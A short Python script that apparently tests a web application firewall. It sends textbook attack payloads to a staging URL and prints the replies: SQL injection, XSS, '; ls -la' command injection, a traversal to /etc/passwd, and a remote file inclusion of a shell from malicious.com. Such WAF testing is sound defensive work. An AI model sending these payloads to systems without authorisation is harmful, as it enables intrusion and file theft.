import requests

def test_sql_injection(target_url):
    print("[+] Testing SQL Injection...")
    payload = {"user": "admin' OR '1'='1"}
    response = requests.get(target_url, params=payload)
    print(response.text)

def test_xss(target_url):
    print("[+] Testing Cross-Site Scripting (XSS)...")
    payload = {"input": "<script>alert('XSS')</script>"}
    response = requests.post(target_url, data=payload)
    print(response.text)

def test_command_injection(target_url):
    print("[+] Testing Command Injection...")
    payload = {"cmd": "; ls -la"}
    response = requests.post(target_url, data=payload)
    print(response.text)

def test_local_file_inclusion(target_url):
    print("[+] Testing Local File Inclusion (LFI)...")
    payload = {"file": "../../../../etc/passwd"}
    response = requests.get(target_url, params=payload)
    print(response.text)

def test_remote_file_inclusion(target_url):
    print("[+] Testing Remote File Inclusion (RFI)...")
    payload = {"file": "http://malicious.com/shell.php"}
    response = requests.get(target_url, params=payload)
    print(response.text)

def test_header_injection(target_url):
    print("[+] Testing HTTP Header Injection...")
    headers = {"User-Agent": "<script>alert('Header Injection')</script>"}
    response = requests.get(target_url, headers=headers)
    print(response.text)

if __name__ == "__main__":
    TARGET_URL = "https://stage.fojiapps.com/"  # Replace with your WAF-protected endpoint

    test_sql_injection(TARGET_URL)
    test_xss(TARGET_URL)
    test_command_injection(TARGET_URL)
    test_local_file_inclusion(TARGET_URL)
    test_remote_file_inclusion(TARGET_URL)
    test_header_injection(TARGET_URL)

    print("[+] All tests executed. Review WAF logs for details.")